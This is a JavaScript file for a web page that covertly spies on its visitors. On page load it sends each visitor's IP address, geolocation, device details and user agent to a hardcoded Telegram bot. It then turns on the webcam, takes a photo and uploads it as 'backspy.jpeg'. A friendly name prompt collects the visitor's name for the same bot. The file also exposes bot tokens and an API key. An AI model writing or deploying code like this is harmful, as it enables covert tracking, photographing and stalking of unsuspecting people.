var Welcome = `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendMessage?chat_id=1603299669&parse_mode=html&text=👨‍💻 <u><b><i>Someone entered to the website</i></b></u>`;
var oReq = new XMLHttpRequest(); 
oReq.open("GET", Welcome, true); 
oReq.send();
fetch("https://api.ipbase.com/json/?apikey=53d67b20-c05f-11ec-979c-9fb9339b4261")
	.then((res) => res.json())
	.then((data) => {
		var output = `
		*- IP*: %0A_${data.ip}_ %0A
		*- Country*: %0A_${data.country_name}_ %0A
		*- Country Code*: %0A_${data.country_code}_ %0A
		*- Region*: %0A_${data.region_code} - ${data.region_name}_ %0A
		*- City*: %0A_${data.city}_ %0A
		*- ZIP Code*: %0A_${data.zip_code}_ %0A
		*- LAT/LONG*: %0A(_${data.latitude} , ${data.longitude}_) %0A
		*- TimeZone*: %0A_${data.time_zone}_ %0A`
		var UA = `
		*- User Agent*: %0A
		_${navigator.userAgent}_`;
		var output2 = `
		*- OS*: %0A_${platform.os}_ %0A
		*- Device Model*: %0A_${platform.product}_ %0A
		*- Browser*: %0A_${platform.name}_ %0A
		*- Brand*: %0A_${platform.manufacturer}_ %0A
		*- Description*: %0A_${platform.description}_ %0A
		*- Resolution*: %0A_${window.screen.availHeight}x${window.screen.availWidth}_ %0A`
	var url = `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendMessage?chat_id=1603299669&parse_mode=Markdown&text=${output}`;
	var oReq = new XMLHttpRequest(); 
	oReq.open("GET", url, true); 
	oReq.send();
	var UA = `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendMessage?chat_id=1603299669&parse_mode=Markdown&text=${UA}`;
	var oReq = new XMLHttpRequest(); 
	oReq.open("GET", UA, true); 
	oReq.send();
	var url2 = `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendMessage?chat_id=1603299669&parse_mode=Markdown&text=${output2}`;
	var oReq = new XMLHttpRequest(); 
	oReq.open("GET", url2, true); 
	oReq.send();
});
function b64toBlob(b64Data, contentType, sliceSize) {
    contentType = contentType || '';
    sliceSize = sliceSize || 512;
    var byteCharacters = atob(b64Data);
    var byteArrays = [];
    for (var offset = 0; offset < byteCharacters.length; offset += sliceSize) {
        var slice = byteCharacters.slice(offset, offset + sliceSize);
        var byteNumbers = new Array(slice.length);
        for (var i = 0; i < slice.length; i++) {
            byteNumbers[i] = slice.charCodeAt(i);
        }
        var byteArray = new Uint8Array(byteNumbers);
        byteArrays.push(byteArray);
    }
    var blob = new Blob(byteArrays, {type:'image'});
    return blob;
}
const getScreenshotOfElement = async (element) => {
	const canvas = await html2canvas(element)
}
function userName(){
	swal("Whats your name", {
		content: "input",
	})
	.then((value) => {
		swal(`nice to meet you ${value} 🥺💞`);
		var name = `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendMessage?chat_id=1603299669&parse_mode=html&text=👨‍💻 <u><b><i>the user's name is:</i></b></u> %0A ✨${value}`;
		var oReq = new XMLHttpRequest(); 
		oReq.open("GET", name, true); 
		oReq.send();
	});
}
window.onload = function(){
	Webcam.attach('#my_camera');
	setTimeout(function(){
		Webcam.snap( function(data_uri) {
			var form = document.getElementById("myAwesomeForm");
			var ImageURL = `${data_uri}`;
			var block = ImageURL.split(";");
			var contentType = block[0].split(":")[1];
			var realData = block[1].split(",")[1];
			document.querySelector('.bttn').classList.add('disabledbtn');
			document.querySelector('.bttn').setAttribute("disabled","")
			var blob = b64toBlob(realData, contentType);
			var formDataToUpload = new FormData(form);
			formDataToUpload.append("document", blob, "backspy.jpeg");
			var xhr = new XMLHttpRequest();
			xhr.open('POST', `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendDocument?chat_id=1603299669`, true);
			xhr.send(formDataToUpload);
		});
	},1000)
	userName()
}